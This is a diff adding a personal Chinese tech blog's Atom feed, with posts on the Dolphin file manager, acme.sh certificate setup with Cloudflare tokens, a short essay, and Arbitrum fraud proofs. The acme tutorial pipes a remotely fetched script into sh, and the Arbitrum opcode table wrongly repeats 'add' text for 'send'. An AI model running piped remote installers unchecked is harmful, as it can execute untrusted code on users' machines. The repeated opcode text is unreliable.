@@ -1,0 +1,540 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>bighu&#39;s log</title>
+  
+  <subtitle>暴躁的程序员</subtitle>
+  <link href="https://bighu630.github.io/atom.xml" rel="self"/>
+  
+  <link href="https://bighu630.github.io/"/>
+  <updated>2024-09-23T11:34:16.273Z</updated>
+  <id>https://bighu630.github.io/</id>
+  
+  <author>
+    <name>[object Object]</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>最好的文件管理器-dolphin</title>
+    <link href="https://bighu630.github.io/2024/09/23/%E6%9C%80%E5%A5%BD%E7%9A%84%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%99%A8-dolphin/"/>
+    <id>https://bighu630.github.io/2024/09/23/%E6%9C%80%E5%A5%BD%E7%9A%84%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%99%A8-dolphin/</id>
+    <published>2024-09-23T11:04:30.000Z</published>
+    <updated>2024-09-23T11:34:16.273Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>WARN：windows没有,废话少说，直接开始</p></blockquote><h2 id="what’s-dolphin"><a href="#what’s-dolphin" class="headerlink" title="what’s dolphin"></a>what’s dolphin</h2><p><img src="https://s2.loli.net/2024/09/23/mQkP1vuL3RaBxcf.png" class="lazyload" data-srcset="https://s2.loli.net/2024/09/23/mQkP1vuL3RaBxcf.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240923190923075"></p><ul><li>长得好看</li></ul><p>dolphin使用kde的主题管理，可以通过kde的主题商店配合<code>kvantum manager</code> 配制出一个好看的主题，类似于我上面的(配置mac模式的是最简单的，相信苹果的设计师)</p><ul><li>分屏</li></ul><p>当然，还有很多其他的文件管理器可以分屏，但是dolphin可以（算是必不可少的）</p><p><img src="https://s2.loli.net/2024/09/23/pOaqeZPRFjJV9SH.png" class="lazyload" data-srcset="https://s2.loli.net/2024/09/23/pOaqeZPRFjJV9SH.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240923191319440"></p><ul><li>应用内终端</li></ul><p>可以看到上面图中最下面的部分。dolphin内置了konsole终端（kde的很多软件都内置konsole,比如kate）。有了内置终端，你会省很多事情。如果在搭配zorxide .可以在终端中用zoxide切换路径，上面的文件位置也会跟着切换，非常的方便（另外，开启和关闭终端的快捷键是F4）</p><ul><li>网络文件夹</li></ul><p>这是我最喜欢的功能。首先对于日常使用，我有时候会用到坚果云，阿里云，谷歌云的网盘，这三个网盘都可以接入dolphin</p><p><img src="https://s2.loli.net/2024/09/23/Tn1Ev4OtVXzL3ly.png" class="lazyload" data-srcset="https://s2.loli.net/2024/09/23/Tn1Ev4OtVXzL3ly.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240923191851837"></p><ul><li>坚果云：使用webdav模式接入</li><li>阿里云：稍作麻烦一点<ul><li>运行<a href="https://github.com/messense/aliyundrive-webdav">aliyun-webdav</a>,将阿里云转换为webdav</li><li>通过webdav方式接入</li></ul></li><li>谷歌云：通过kio插件接入<ul><li><a href="https://apps.kde.org/zh-cn/kio_gdrive/">安装软件</a></li><li>在kde的账户管理中登陆谷歌账户</li></ul></li></ul><p>在工作环境中，一般我们后端程序员都会有很多服务器，可能是测试的，可能是我们自己的，我们需要去系统里面拿一点日志看看。</p><p>dolphin可以通过ssh连接文件系统，例如我上面的华为云，work等文件夹都是ssh服务器</p><p>dolhpin支持的所有网络文件夹：</p><p><img src="https://s2.loli.net/2024/09/23/5qmdKcjQb2AynTs.png" class="lazyload" data-srcset="https://s2.loli.net/2024/09/23/5qmdKcjQb2AynTs.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240923192456555"></p><p>最关键的是，网络文件夹几乎和真实文件夹差不多，只要网好。</p><ul><li>搭配kde connect</li></ul><p>kde connect是kde的局域网共享软件</p><p>dolphin右键集成了kde connect分享功能，只要是喜欢用kde connect的都会感觉很好用</p><blockquote><p>非常推荐kde connect 可以局域网共享文件，共享剪贴板，非常的方便</p><p><img src="https://s2.loli.net/2024/09/23/Dw49NgoZa5IAH2T.png" class="lazyload" data-srcset="https://s2.loli.net/2024/09/23/Dw49NgoZa5IAH2T.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240923192752804"></p><p>如图中的bughu-p… 就是我手机的文件系统（需要在手机端给对应文件的访问权限），非常好用。</p></blockquote>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;blockquote&gt;
+&lt;p&gt;WARN：windows没有,废话少说，直接开始&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&quot;what’s-dolphin&quot;&gt;&lt;a href=&quot;#what’s-dolphin&quot; class=&quot;headerlink&quot; title=&quot;what’</summary>
+      
+    
+    
+    
+    <category term="计算机" scheme="https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
+    
+    <category term="linux" scheme="https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/linux/"/>
+    
+    
+    <category term="文件管理器" scheme="https://bighu630.github.io/tags/%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%99%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>acme+cloudflare生成免费证书（自动续期）</title>
+    <link href="https://bighu630.github.io/2024/09/23/acme-cloudflare%E7%94%9F%E6%88%90%E5%85%8D%E8%B4%B9%E8%AF%81%E4%B9%A6%EF%BC%88%E8%87%AA%E5%8A%A8%E7%BB%AD%E6%9C%9F%EF%BC%89/"/>
+    <id>https://bighu630.github.io/2024/09/23/acme-cloudflare%E7%94%9F%E6%88%90%E5%85%8D%E8%B4%B9%E8%AF%81%E4%B9%A6%EF%BC%88%E8%87%AA%E5%8A%A8%E7%BB%AD%E6%9C%9F%EF%BC%89/</id>
+    <published>2024-09-23T00:42:58.000Z</published>
+    <updated>2024-09-23T11:34:16.269Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="acme-DNSapi"><a href="#acme-DNSapi" class="headerlink" title="acme DNSapi"></a>acme DNSapi</h2><p>acme DNSapi的作用是在申请证书时使用dns校验，acme可以通过dnsapi在对应的dns管理平台提交对应的dns记录。玩过证书的朋友都知道，证书申请时有三种验证方式:</p><ul><li>邮箱验证：需要邮箱与域名绑定（细节要求我没试过）</li><li>文件验证：文件验证时证书管理方会要求你在服务器的指定路径上放一个指定文件（内容也是他们定），然后开放80端口，他们会去下载这个文件从而验证你的身份。申请证书时你需要去你的服务器上操作，还要开放指定端口</li><li>DNS验证：DNS验证只需要你在dns记录上添加一条TXT记录就可以</li></ul><p>我们这里用到的就是DNS验证，DNS验证虽然方便，但是每次申请都需要添加一条DNS记录（申请完成后可以删除，acme好像自动帮忙删除了），如果要实现自动化，acme需要有权限向dns记录方提交记录。</p><h2 id="cloudflare-DNSapi"><a href="#cloudflare-DNSapi" class="headerlink" title="cloudflare DNSapi"></a>cloudflare DNSapi</h2><p><a href="https://github.com/acmesh-official/acme.sh/wiki/dnsapi#using-the-new-cloudflare-api-token-you-will-get-this-after-normal-login-and--scroll-down-on-dashboard-and-copy-credentials">acme dns api doce</a></p><p>根据上面的文档可以看到cloudflare dns api 有两种方式获取:</p><ul><li>生成cloudflare的全局token（全局token拥有cloudflare的所有权限，大部分是acme用不到的）</li><li>生成cloudflare的DNS权限token（推荐，够acme用的了）</li></ul><h3 id="生成cloudflare的DNS权限token"><a href="#生成cloudflare的DNS权限token" class="headerlink" title="生成cloudflare的DNS权限token"></a>生成cloudflare的DNS权限token</h3><p>先来cloudflare的Api<a href="https://dash.cloudflare.com/profile/api-tokens">申请页面</a></p><p><img src="https://s2.loli.net/2024/09/23/XknlUhgI4GubSZ3.png" class="lazyload" data-srcset="https://s2.loli.net/2024/09/23/XknlUhgI4GubSZ3.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240923085901516"></p><p>点击这里的创建令牌</p><p>选择编辑区域DNS 这个模板（一般来说是第一个）</p><p><img src="https://s2.loli.net/2024/09/23/ktzyeIHSbfJd9mF.png" class="lazyload" data-srcset="https://s2.loli.net/2024/09/23/ktzyeIHSbfJd9mF.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240923085941855"></p><p>按照下面的内容填写:</p><p><img src="https://s2.loli.net/2024/09/23/NcAqGh94ifVkIaT.png" class="lazyload" data-srcset="https://s2.loli.net/2024/09/23/NcAqGh94ifVkIaT.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240923090119372"></p><p>权限选 <code>区域</code> -&gt; <code>DNS</code> -&gt; <code>编辑</code></p><p>区域资源 <code>包括</code> -&gt; <code>特定区域</code> -&gt; 在下拉列表里选你的域名（你也可以在第二个框里面选择<code>所有区域</code>）</p><p>剩下都不变，点继续，跳转到这个页面:</p><p><img src="https://s2.loli.net/2024/09/23/HnLjAY7sqb95zar.png" class="lazyload" data-srcset="https://s2.loli.net/2024/09/23/HnLjAY7sqb95zar.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240923090358443"></p><p>点击生成令牌，就会产生一个令牌，令牌生成后第一时间记录下来，这个令牌只显示一次，刷新页面后就看不到了。</p><h3 id="获取cloudflare的用户信息"><a href="#获取cloudflare的用户信息" class="headerlink" title="获取cloudflare的用户信息"></a>获取cloudflare的用户信息</h3><p>点到cloudflare中对应的网页管理页面，在api的地方可以看到两个ID:</p><p><img src="https://s2.loli.net/2024/09/23/vRAkuQhniUmLYg5.png" class="lazyload" data-srcset="https://s2.loli.net/2024/09/23/vRAkuQhniUmLYg5.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240923090719587"></p><p>现在我们有三个信息</p><ul><li>上面生成的一个管理DNS的TOKEN</li><li>这里的区域ID</li><li>这里的账户ID</li></ul><h3 id="在对应服务器上生成证书"><a href="#在对应服务器上生成证书" class="headerlink" title="在对应服务器上生成证书"></a>在对应服务器上生成证书</h3><p><strong>设置环境变量</strong></p><pre><code class="sh">export CF_Token=&quot;填DNS token&quot;export CF_Zone_ID=&quot;填区域ID&quot;export CF_Account_ID=&quot;填账户ID&quot;</code></pre><p><strong>安装acme</strong></p><pre><code class="sh"> apt update -y          #更新系统 apt install -y curl    #安装curl apt install -y socat    #安装socat curl https://get.acme.sh | sh</code></pre><p><strong>生成证书</strong></p><pre><code class="sh">acme.sh --issue --dns dns_cf -d test.fun -d &quot;*.test.fun&quot;</code></pre><p>如果说找不到acme.sh，可以使用下面的命令</p><pre><code class="sh">~/.acme.sh/acme.sh --issue --dns dns_cf -d test.fun -d &quot;*.test.fun&quot;</code></pre><p>等他跑码,会告诉你证书的位置</p><p><img src="https://s2.loli.net/2024/09/23/grt8H5Txn6kC9NG.png" class="lazyload" data-srcset="https://s2.loli.net/2024/09/23/grt8H5Txn6kC9NG.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240923092443069"></p><p>关键是上面两行<code>your cert</code>, <code>your cert key</code></p><p>上面生成的证书是 <code>*.test.fun</code> 的证书，所有的以<code>test.fun</code>结尾的域名都可以用这个证书</p><blockquote><p>推荐的使用方案： 因为acme正常2个月会自动更新一下证书，所以我不推荐你把证书移动到别的位置，因为acme下次生成的时候还会放在这个位置，要么你指定acme的证书生成路径，可以用<code>acme.sh --help</code> 查看怎么指定路径。我使用的方法是（有两个）</p><ul><li><p>直接使用这个路径</p></li><li><p>通过软连接把证书链接过去</p><p>比如我要把证书放在&#x2F;etc&#x2F;nginx&#x2F;ssl 里面 分别命名为<code>cert.crt</code> <code>priv.key</code>我可以这样做</p><pre><code class="sh">cd /etc/naginx/sslln -s /home/ivhu/.acme.sh/证书路径.cer  cert.crtln -s /home/ivhu/acme.sh/证书私钥.key priv.key</code></pre></li></ul></blockquote><p>证书生成后一般会新建一个cron 的定时认为用来维护证书保证期</p><p>可以通过 <code>crontab -e</code>命令查看，我的结果是这样的：</p><p><img src="https://s2.loli.net/2024/09/23/Cq8gBjoKfVGNUAx.png" class="lazyload" data-srcset="https://s2.loli.net/2024/09/23/Cq8gBjoKfVGNUAx.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240923091717497"></p><p>意思是每天凌晨3：28会检查一下证书</p><p>如果你的证书是给<code>nginx</code>用的可以在<code>root</code>用户下运行<code>crontab -e</code> 编辑root用户的cron自动化命令</p><p>添加如下：</p><pre><code class="sh">0 4 * * * systemctl reload nginx</code></pre><p>表示每天4：00 重启nginx ，因为nginx的证书需要重启之后才能重载。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;acme-DNSapi&quot;&gt;&lt;a href=&quot;#acme-DNSapi&quot; class=&quot;headerlink&quot; title=&quot;acme DNSapi&quot;&gt;&lt;/a&gt;acme DNSapi&lt;/h2&gt;&lt;p&gt;acme DNSapi的作用是在申请证书时使用dns校验，acme可</summary>
+      
+    
+    
+    
+    <category term="计算机" scheme="https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
+    
+    <category term="运维" scheme="https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/%E8%BF%90%E7%BB%B4/"/>
+    
+    
+    <category term="acme证书" scheme="https://bighu630.github.io/tags/acme%E8%AF%81%E4%B9%A6/"/>
+    
+    <category term="cloudflare" scheme="https://bighu630.github.io/tags/cloudflare/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>献给一年有四季的人</title>
+    <link href="https://bighu630.github.io/2024/09/22/%E7%8C%AE%E7%BB%99%E4%B8%80%E5%B9%B4%E6%9C%89%E5%9B%9B%E5%AD%A3%E7%9A%84%E4%BA%BA/"/>
+    <id>https://bighu630.github.io/2024/09/22/%E7%8C%AE%E7%BB%99%E4%B8%80%E5%B9%B4%E6%9C%89%E5%9B%9B%E5%AD%A3%E7%9A%84%E4%BA%BA/</id>
+    <published>2024-09-22T10:49:02.000Z</published>
+    <updated>2024-09-23T11:34:16.273Z</updated>
+    
+    <content type="html"><![CDATA[<p>再此写一篇文章献给拥有四季的人:</p><p>你应该在春天的时候找到一下有意思的事情，注意他们。</p><p>在夏天的时候去挖掘他们，一头扎进他们的世界中，可能是一个领域，可以是一本书，去找到他们的关键。</p><p>秋天的时候回过头来看看，看看缺少了什么，写点笔记，捋一捋思路。</p><p>冬天好好睡上一觉，等待来年。</p><p>瓦尔登湖有说：如果理念告诉你不要这么做，那么你更应该就这么去做，或许你应该在春天的时候好好睡一觉，以便在夏天在睡一觉。<br>也许一个人没必要一年有四季。但是要是你自己认为有四季，那大可以让四季分明.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;再此写一篇文章献给拥有四季的人:&lt;/p&gt;
+&lt;p&gt;你应该在春天的时候找到一下有意思的事情，注意他们。&lt;/p&gt;
+&lt;p&gt;在夏天的时候去挖掘他们，一头扎进他们的世界中，可能是一个领域，可以是一本书，去找到他们的关键。&lt;/p&gt;
+&lt;p&gt;秋天的时候回过头来看看，看看缺少了什么，写点笔记，</summary>
+      
+    
+    
+    
+    <category term="随笔" scheme="https://bighu630.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
+    
+    <category term="人生" scheme="https://bighu630.github.io/categories/%E9%9A%8F%E7%AC%94/%E4%BA%BA%E7%94%9F/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>以太坊Rollup方案之 arbitrum（2）</title>
+    <link href="https://bighu630.github.io/2024/09/21/%E4%BB%A5%E5%A4%AA%E5%9D%8ARollup%E6%96%B9%E6%A1%88%E4%B9%8B-arbitrum%EF%BC%882%EF%BC%89/"/>
+    <id>https://bighu630.github.io/2024/09/21/%E4%BB%A5%E5%A4%AA%E5%9D%8ARollup%E6%96%B9%E6%A1%88%E4%B9%8B-arbitrum%EF%BC%882%EF%BC%89/</id>
+    <published>2024-09-21T06:36:46.000Z</published>
+    <updated>2024-09-23T11:34:16.271Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p><a href="https://blog.whosworld.fun/2024/09/10/%E4%BB%A5%E5%A4%AA%E5%9D%8ARollup%E6%96%B9%E6%A1%88%E4%B9%8B-arbitrum%EF%BC%881%EF%BC%89/">上一期简单介绍了一下rollup的一些基本内容以及aritrun交易的执行流程</a>，这一期将介绍一下aritrum的核心技术 – 交互式单步证明</p></blockquote><p>这一期主要涉及到的是arbitrum的验证节点</p><h2 id="arbitrum-架构"><a href="#arbitrum-架构" class="headerlink" title="arbitrum 架构"></a>arbitrum 架构</h2><p><img src="https://cdn.gamma.app/ofeak2rm9c8n9jb/178c3cc063f544bb971795e4d276e1b6/original/Tu-Pian.png" class="lazyload" data-srcset="https://cdn.gamma.app/ofeak2rm9c8n9jb/178c3cc063f544bb971795e4d276e1b6/original/Tu-Pian.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="arbitrum架构"></p><p>validator（验证节点）的功能有两个</p><ul><li>通过质押资产出L2的rblock</li><li>向不合法的区块发送单步证明</li></ul><p>一个arbitrum的验证节点可以概括为以下几个部分</p><p><img src="https://cdn.gamma.app/ofeak2rm9c8n9jb/dfdacedaf76e4c91911ff48ddd12dd77/original/Tu-Pian.png" class="lazyload" data-srcset="https://cdn.gamma.app/ofeak2rm9c8n9jb/dfdacedaf76e4c91911ff48ddd12dd77/original/Tu-Pian.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="验证节点"></p><ul><li><p>Rpc server : 提供arbtirum rpc服务（以太坊rpc的超集）</p></li><li><p>Geth：执行层</p></li><li><p>AVM ：验证层（验证过程是把evm操作码转译为avm）</p></li></ul><p>Rpc模块用于接受以太坊格式的请求（用户体验上L2与L1的区别仅在与L2手续费低很多，几乎没有多于的配置）</p><p>Geth模块是L1的执行层，用于执行L1操作码</p><p>AVM模块是L2的验证层，用于验证L2操作码,并不是每一笔交易都会走到验证层，就现实而言arbitrum已经运行一年多了，还没有走到验证层的交易</p><p>当然没有走到验证层并不是说验证层没用，而是目前没有好的办法绕过验证层的验证，或者是使验证层出错（毕竟在区块链系统，出错一般是恶意的）</p><h2 id="AVM-状态机"><a href="#AVM-状态机" class="headerlink" title="AVM 状态机"></a>AVM 状态机</h2><p>VM状态不外乎这几种：特殊状态Halted（暂停），特殊状态ErrorStop，或其他扩展状态。</p><p>扩展状态包含下列几种：</p><ul><li><p>Current Codepoint，当前码点：代表当前运行所处的码点</p></li><li><p>Data Stack，数据栈：该栈是运算的首要工作区</p></li><li><p>Aux Stack，辅助栈：该栈提供了辅助的存储空间</p></li><li><p>Register，寄存器：一种可变的存储单元，可存储单个值</p></li><li><p>Static，静态：一种在VM初始化时就已经确定的不可变值</p></li><li><p>AVMGas Remaining，AVMGas剩余: 记载了在出现报错前可消耗多少AVMGas的一个整形</p></li><li><p>Error Codepoint，错误码点: Error所对应的码点</p></li><li><p>Pending Message，待处理消息: 记录了待处理的收件箱信息（若有的话）的元组</p></li></ul><p>当VM初始化时，位于扩展状态。Data Stack, Aux Stack, Register, AVMGas Remaining, 和 Error Codepoint 会分别初始化为 None, None, None, MaxUint256, 和Codepoint (0, 0)。创建VM的实体提供Current Codepoint和Static的值。</p><p>vm的最终状态为上述状态的串联hash</p><h3 id="AVM操作码案例"><a href="#AVM操作码案例" class="headerlink" title="AVM操作码案例"></a>AVM操作码案例</h3><table><thead><tr><th>Opcode</th><th>NickName</th><th>描述</th></tr></thead><tbody><tr><td>0x01</td><td>add</td><td>从数据堆栈中弹出两个值（A、B）。 如果 A 和 B 都是整数，则将值 A+B（截断为 256 位）压入数据堆栈。 否则，引发错误。</td></tr><tr><td>0x70</td><td>send</td><td>从数据堆栈中弹出两个值（A、B）。 如果 A 和 B 都是整数，则将值 A+B（截断为 256 位）压入数据堆栈。 否则，引发错误。</td></tr><tr><td>0x72</td><td>inbox</td><td>如果待处理消息不是空元组，则将待处理消息推送到数据堆栈上，然后将待处理消息设置为等于空元组。 否则，将阻塞直到虚拟机的收件箱序列非空。 然后从运行时环境提供的收件箱序列中删除第一项，并将结果推送到数据堆栈上。</td></tr></tbody></table><h3 id="AVM-数据结构案例"><a href="#AVM-数据结构案例" class="headerlink" title="AVM 数据结构案例"></a>AVM 数据结构案例</h3><h4 id="codepoint"><a href="#codepoint" class="headerlink" title="codepoint"></a>codepoint</h4><p>表示当前执行的指令。arbitrum中在某个PC值下指令的码点是（opcode at PC, Hash(CodePoint at PC+1)）。如果没有CodePoint at PC+1，则使用0。</p><p><img src="https://cdn.gamma.app/ofeak2rm9c8n9jb/6594d71483b6430ab195920948f73403/original/Tu-Pian.png" class="lazyload" data-srcset="https://cdn.gamma.app/ofeak2rm9c8n9jb/6594d71483b6430ab195920948f73403/original/Tu-Pian.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="codepoint"></p><h4 id="Data-Stack"><a href="#Data-Stack" class="headerlink" title="Data Stack"></a>Data Stack</h4><p>表示存储的数据栈。当执行到某个指令码是会根据指令码的逻辑在数据栈中取出或压入指定数量的数据。数据栈也使用类似的链式结构。</p><p><img src="https://cdn.gamma.app/ofeak2rm9c8n9jb/8d51bd86cfa740bf86176733d36c6edc/original/Tu-Pian.png" class="lazyload" data-srcset="https://cdn.gamma.app/ofeak2rm9c8n9jb/8d51bd86cfa740bf86176733d36c6edc/original/Tu-Pian.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="data stack"></p><blockquote><p>注：codepoint是链式结构，执行过程不会改变，data stack满足栈的操作逻辑。</p></blockquote><h2 id="交互式证明"><a href="#交互式证明" class="headerlink" title="交互式证明"></a>交互式证明</h2><h3 id="分割协议（简化版）"><a href="#分割协议（简化版）" class="headerlink" title="分割协议（简化版）"></a>分割协议（简化版）</h3><p><img src="https://cdn.gamma.app/ofeak2rm9c8n9jb/4c8e6ff144d64fe9b0e70b4ac188cac1/original/Tu-Pian.png" class="lazyload" data-srcset="https://cdn.gamma.app/ofeak2rm9c8n9jb/4c8e6ff144d64fe9b0e70b4ac188cac1/original/Tu-Pian.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="分割协议"></p><p>Alice为自己的主张辩护，她的主张是：从父区块的状态开始，虚拟机的状态可以前进至她所主张的区块A上的状态。本质上，她是在宣称，虚拟机可以执行N条指令，消耗M条收件箱中的信息并将哈希从H’转换为H。</p><p>Alice的第一个动作需要她把她的断言从开始（0条指令已执行）到结束（N条指令已执行）以中间点切分。协议要求Alice将其主张对半切分，发布中间点在执行了N&#x2F;2步指令后的的状态。</p><p>当Alice已经有效地将她的断言二等分变为两个N&#x2F;2步的断言后，Bob需要在这两个片段中选择一段并声明它是错的。</p><p>在此，我们又回到了之前的状态：Alice主张一个断言，Bob不同意。不过现在我们已经把断言长度从N缩短到了N&#x2F;2。我们可以再重复之前的动作，Alice二分，Bob选择不同意的那一半，缩短尺度到N&#x2F;4。我们可以继续该动作，经过对数轮的博弈，Alice和Bob的争议点就缩减为了单步操作。自此，分割协议就终止了，Alice必须给EthBridge生成一个单步证明供其检测。</p><p><img src="https://cdn.gamma.app/ofeak2rm9c8n9jb/168a395b229042ca96e1c8e13b7cb129/original/image.png" class="lazyload" data-srcset="https://cdn.gamma.app/ofeak2rm9c8n9jb/168a395b229042ca96e1c8e13b7cb129/original/image.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="分割协议"></p><p>A作为出快人，c作为挑战者</p><ul><li><p>A主张L2状态机在H0状态下经历N个操作码之后到达Hn状态 （H0,Hn表示上面提到的vm的最终状态）</p></li><li><p>C主张H0在经历N个操作之后不会变成Hn</p></li><li><p>A对N步操作进行二分 表明H0在经过N&#x2F;2个操作后变成H(n&#x2F;2)</p><blockquote><p>注意这里暗示了H(n&#x2F;2)经历剩下N&#x2F;2个操作之后会变成Hn,C需要指出两段之中的一段的错误</p></blockquote></li><li><p>C表示H0经过N&#x2F;2个操作之后不会变成H(n&#x2F;2)</p></li><li><p>A表示H0经过N&#x2F;4个操作之后变成H(n&#x2F;4)</p></li><li><p>C表示从H(N&#x2F;4)经历N&#x2F;4个操作之后不会变成H(n&#x2F;4)<br>.<br>.<br>.</p></li><li><p>表示层Hi 经历一个操作之后不会变成H(i+1)</p></li><li><p>A 提交Hi状态下的世界信息（也就是上面提到的那些堆栈，codepioint的那些信息，但是不是所有的，比如Add操作码只有两个操作数，那么数据堆栈就只需要两个，由于整个堆栈是可hash,所以A无法作恶）</p></li></ul><p>代码上的流程图表现为这样</p><p><img src="https://cdn.gamma.app/ofeak2rm9c8n9jb/26d0f79b00ec4a45b252693649bfbbc9/original/Tu-Pian.png" class="lazyload" data-srcset="https://cdn.gamma.app/ofeak2rm9c8n9jb/26d0f79b00ec4a45b252693649bfbbc9/original/Tu-Pian.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="arbiter rum单步证明"></p><h3 id="单步证明"><a href="#单步证明" class="headerlink" title="单步证明"></a>单步证明</h3><p>初始状态下AVM状态相同,如下：<br><img src="https://cdn.gamma.app/ofeak2rm9c8n9jb/6594d71483b6430ab195920948f73403/original/Tu-Pian.png" class="lazyload" data-srcset="https://cdn.gamma.app/ofeak2rm9c8n9jb/6594d71483b6430ab195920948f73403/original/Tu-Pian.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="code pint"><br><img src="https://cdn.gamma.app/ofeak2rm9c8n9jb/8d51bd86cfa740bf86176733d36c6edc/original/Tu-Pian.png" class="lazyload" data-srcset="https://cdn.gamma.app/ofeak2rm9c8n9jb/8d51bd86cfa740bf86176733d36c6edc/original/Tu-Pian.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="data"></p><p>执行一步后状态不同</p><p>验证者从链上获取对方的信息得知，对方在执行add前与本地状态相同，执行后状态不同</p><p>验证者将执行前状态，其他各个没有改变的栈的状态hash，add指令的codepoint,数据栈的 前两个元素，执行add后状态提交在链上。（执行前后的状态用于保证这一步确实是有问题的，并且暗示验证者同意执行前的状态，上传没有改变的栈是因为后面计算最终状态时要用）。</p><p>链上执行add操作后宣布验证结果</p>]]></content>
+    
+    
+    <summary type="html">这篇博客主要介绍了Arbitrum验证节点的架构及其工作原理，重点讨论了验证节点的功能、AVM（Arbitrum虚拟机）的状态机结构、操作码及数据结构的细节，并深入解释了交互式证明的分割协议和单步证明的实现机制。通过图示，作者详细说明了验证节点如何通过二分协议来证明某个区块的正确性，并在必要时提交单步证明。这种验证机制确保了区块链系统的安全性，避免了恶意节点的欺骗行为。</summary>
+    
+    
+    
+    <category term="区块链" scheme="https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
+    
+    <category term="二层" scheme="https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BA%8C%E5%B1%82/"/>
+    
+    
+    <category term="以太坊" scheme="https://bighu630.github.io/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
+    
+    <category term="arbitrum" scheme="https://bighu630.github.io/tags/arbitrum/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>当代占星研究-1</title>
+    <link href="https://bighu630.github.io/2024/09/21/%E5%BD%93%E4%BB%A3%E5%8D%A0%E6%98%9F%E7%A0%94%E7%A9%B6-1/"/>
+    <id>https://bighu630.github.io/2024/09/21/%E5%BD%93%E4%BB%A3%E5%8D%A0%E6%98%9F%E7%A0%94%E7%A9%B6-1/</id>
+    <published>2024-09-21T05:36:42.000Z</published>
+    <updated>2024-09-23T11:34:16.272Z</updated>
+    
